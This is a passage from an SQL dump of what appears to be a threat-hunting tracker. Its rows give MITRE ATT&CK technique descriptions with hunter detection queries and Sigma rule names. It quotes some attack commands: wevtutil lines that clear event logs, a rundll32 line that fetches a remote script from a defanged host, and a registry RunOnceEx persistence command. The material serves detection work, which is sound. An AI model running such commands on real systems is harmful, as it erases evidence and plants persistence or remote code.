Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:43:34','2021-05-06 14:43:34','2021-05-06',0,NULL,45,45,12,13,0,NULL),(119,5,1,'Command and Scripting Interpreter - T1059.006','\r\n\r\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\r\n\r\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/006/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:43:57','2021-05-06 14:47:22','2021-05-06',0,NULL,38,38,14,15,0,NULL),(120,5,1,'Automated Collection - T1119','Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools.\r\n\r\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files.\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:44:39','2021-05-06 14:44:39','2021-05-06',0,NULL,45,45,14,15,0,NULL),(121,5,1,'Ingress Tool Transfer - T1105','Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1105/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:45:24','2021-05-06 14:48:11','2021-05-06',0,NULL,38,38,16,17,0,NULL),(122,5,1,'Input Capture: Keylogging  - T1056.001','\r\n\r\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\r\n\r\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\r\n\r\n    Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\r\n    Reading raw keystroke data from the hardware buffer.\r\n    Windows Registry modifications.\r\n    Custom drivers.\r\n    Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:46:18','2021-05-06 14:46:18','2021-05-06',0,NULL,45,45,16,17,0,NULL),(123,5,1,'Abuse Elevation Control - T1548.002','Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. [1]\r\n\r\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. [2] [3] An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]\r\n\r\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5] that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\r\n\r\n    eventvwr.exe can auto-elevate and execute a specified binary or script.[6][7]\r\n\r\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.\r\n\r\n+*Hunter Notes*+\r\n<pre>\r\nHost: \r\nSigma rules: sysmon_uac_bypass_sdclt.yml sysmon_uac_bypass_eventvwr.yml win_susp_powershell_empire_uac_bypass.yml win_uac_fodhelper.yml win_uac_cmstp.yml win_uac_wsreset.yml win_wsreset_uac_bypass.yml sysmon_uac_bypass_via_dism.yml\r\n</pre>\r\n\r\n+*Reference*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1548/\r\n</pre> ',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 14:46:33','2021-05-06 18:32:38','2021-05-06',0,NULL,114,114,2,3,0,NULL),(124,5,1,'Signed Binary Proxy Execution: Rundll32  - T1218.011 (H)','Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\r\n\r\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]\r\n\r\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks\r\nh3. ref\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/T1218+-+Signed+Binary+Proxy+Execution+-+CYH\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:47:23','2021-05-06 14:47:23','2021-05-06',0,NULL,30,30,30,31,0,NULL),(125,5,1,'Process Injection: Dynamic-link Library Injection - T1055.001','Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.\r\n\r\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). [1]\r\n\r\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).[2][1]\r\n\r\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\"\r\n\r\nA query for dangerous powershell modules\r\n(Sigma)windows/builtin/win_metasploit_authentication\r\n(Sigma)proxy/proxy_ua_frameworks\r\n(Sigma)linux/lnx_shell_susp_commands\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1055/001/\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 14:50:58','2021-05-06 18:33:28','2021-05-06',0,NULL,114,114,4,5,0,NULL),(126,5,1,'Command and Scripting Interpreter: PowerShell - T1059.001','\r\n\r\nAdversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\r\n\r\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\r\n\r\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\r\n\r\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell\'s underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\r\n\r\nh3. Referernces\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/001/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:52:18','2021-05-06 14:53:16','2021-05-06',0,NULL,38,38,18,19,0,NULL),(127,5,1,'Data from Information Repositories - T1213','Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\r\n\r\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\r\n\r\n    Policies, procedures, and standards\r\n    Physical / logical network diagrams\r\n    System architecture diagrams\r\n    Technical system documentation\r\n    Testing / development credentials\r\n    Work / project schedules\r\n    Source code snippets\r\n    Links to network shares and other internal resources\r\n\r\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include Sharepoint, Confluence, and enterprise databases such as SQL Server.',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:54:30','2021-05-06 14:55:31','2021-05-06',0,NULL,45,45,18,19,0,NULL),(128,5,1,'User Execution: Malicious File - T1204.002','\r\n\r\nAn adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\r\n\r\nAdversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.\r\n\r\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user\'s desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1204/002/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:56:50','2021-05-06 14:58:10','2021-05-06',0,NULL,38,38,20,21,0,NULL),(129,5,1,'Inter-Process Communication - T1559.002','\r\n\r\nAdversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\r\n\r\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. [1] [2] [3]\r\n\r\nMicrosoft Office documents can be poisoned with DDE commands [4] [5], directly or through embedded files [6], and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. [7] DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1559/002/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 15:04:30','2021-05-06 15:04:56','2021-05-06',0,NULL,38,38,22,23,0,NULL),(130,5,1,'Indicator Removal on Host: Timestomp - T1070.006 (H)','Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\r\n\r\nTimestomping may be used along with file name Masquerading to hide malware and tools\r\n\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 15:06:09','2021-05-06 15:08:41','2021-05-06',0,NULL,30,30,32,33,0,NULL),(131,5,1,'Boot Or Logon Autostart Execution - T1547','Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5]  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\r\n\r\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1547+-+Boot+or+Logon+Autostart+Execution\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,6,'2021-05-06 15:06:46','2021-05-06 18:18:36','2021-05-06',0,NULL,5,5,14,15,0,NULL),(132,5,1,'Command and Scripting Interpreter: PowerShell - T1059.001','Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\r\n\r\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\r\n\r\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\r\n\r\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell\'s underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/001/\r\nhttps://confluence.di2e.net/display/CYH836/T1059+-+Command+and+Scripting+Interpreter\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-06 15:11:57','2021-05-06 15:54:30','2021-05-06',0,NULL,38,38,24,25,0,NULL),(133,5,1,'Acquire Infrastructure: Web Services  - T1583.006','Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.',NULL,NULL,1,NULL,1,NULL,1,1,'2021-05-06 15:12:07','2021-05-06 15:22:28','2021-05-06',0,NULL,9,9,50,51,0,NULL),(134,5,1,'Command and Scripting Interpreter: PowerShell - T1059.003','Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\r\n\r\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\r\n\r\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/003/\r\nhttps://confluence.di2e.net/display/CYH836/T1059+-+Command+and+Scripting+Interpreter\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 15:16:06','2021-05-06 15:54:07','2021-05-06',0,NULL,38,38,26,27,0,NULL),(135,5,1,'Event Triggered Execution - T1546.003','Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user logging, or the computer\'s uptime. [1]\r\n\r\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. [2] [3] Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. [4] [5]\r\n\r\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nSigma rule: sysmon_stickykey_like_backdoor.yml\r\n(Playbook) T1546 - Event Triggered Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,2,'2021-05-06 15:19:21','2021-05-06 18:28:18','2021-05-06',0,NULL,5,5,16,17,0,NULL),(136,5,1,'Account Manipulation - T1098.002','Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.\r\n\r\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Set-CASMailbox\"\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\n\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,2,'2021-05-06 15:22:58','2021-05-06 18:25:59','2021-05-06',0,NULL,5,5,18,19,0,NULL),(137,5,1,'Indicator Removal on Host: Clear Windows Event Logs - T1070.001 (H)','\r\n\r\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer\'s alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\r\n\r\nThe event logs can be cleared with the following utility commands:\r\n\r\n    wevtutil cl system\r\n    wevtutil cl application\r\n    wevtutil cl security\r\n\r\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell.\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 15:23:28','2021-05-06 15:26:41','2021-05-06',0,NULL,30,30,34,35,0,NULL),(138,5,1,'Boot or Logon Initiliazation Script - T1037.001','Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1] This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.[2]\r\n\r\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1137- Office Application Startup\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1037/001/\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,3,'2021-05-06 15:24:34','2021-05-06 18:30:02','2021-05-06',0,NULL,5,5,20,21,0,NULL),(139,5,1,'Event Triggered Execution - T1546.015','Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1] References to various COM objects are stored in the Registry.\r\n\r\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary\'s code will be executed instead.[2] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (12 OR 13 OR 14) AND HKCU\\\\Software\\\\Classes\\\\CLSID\\\\*\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>https://attack.mitre.org/techniques/T1546/015/\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,3,'2021-05-06 15:27:21','2021-05-06 18:31:37','2021-05-06',0,NULL,5,5,22,23,0,NULL),(140,5,1,'Proxy - T1090','Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\r\n\r\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\r\n',NULL,NULL,1,NULL,1,NULL,1,0,'2021-05-06 15:27:43','2021-05-06 15:27:43','2021-05-06',0,NULL,9,9,52,53,0,NULL),(141,5,1,'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder - T1547.001','Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pre>\r\nThe following run keys are created by default on Windows systems:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pre>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\n<pre>\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n</pre>\r\n\r\n<pre>\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n</pre>\r\n\r\n<pre>\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n</pre>\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\n\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,10,'2021-05-06 15:29:32','2021-05-06 18:24:50','2021-05-06',0,NULL,5,5,24,25,0,NULL),(142,5,1,'Compromise Infrastructure: Virtual Private Server - T1584.003','Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.[1]\r\n\r\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.\r\n',NULL,NULL,1,NULL,1,NULL,1,0,'2021-05-06 15:31:37','2021-05-06 15:31:37','2021-05-06',0,NULL,9,9,54,55,0,NULL),(143,5,1,'Compromise Infrastructure: Server - T1584.004','Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\r\n\r\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise.\r\n',NULL,NULL,1,NULL,1,NULL,1,0,'2021-05-06 15:33:26','2021-05-06 15:33:26','2021-05-06',0,NULL,9,9,56,57,0,NULL),(144,5,1,'Compromise Infrastructure: Web Services - T1584.006','Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user\'s access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service.[1] Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.',NULL,NULL,1,NULL,1,NULL,1,0,'2021-05-06 15:34:33','2021-05-06 15:34:33','2021-05-06',0,NULL,9,9,58,59,0,NULL),(145,5,1,'Server Software Component - T1505','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.',NULL,NULL,1,NULL,1,NULL,1,0,'2021-05-06 15:36:54','2021-05-06 15:36:54','2021-05-06',0,NULL,9,9,60,61,0,NULL),(146,5,1,'Event Triggered Execution: WMI Event Subscription - T1546.003 / .013','Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer\'s uptime.\r\n\r\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\r\n\r\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (19 OR 20 OR 21)  AND Channel : *sysmon* AND NOT (Whitelist)\r\n\r\n*profile.ps1 can have additional commands for execution of persistence\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,3,'2021-05-06 15:37:42','2021-05-06 18:22:13','2021-05-06',0,NULL,5,5,26,27,0,NULL),(147,5,1,'Scheduled Task/Job - T1053.005','\r\nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\r\n\r\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though at.exe can not 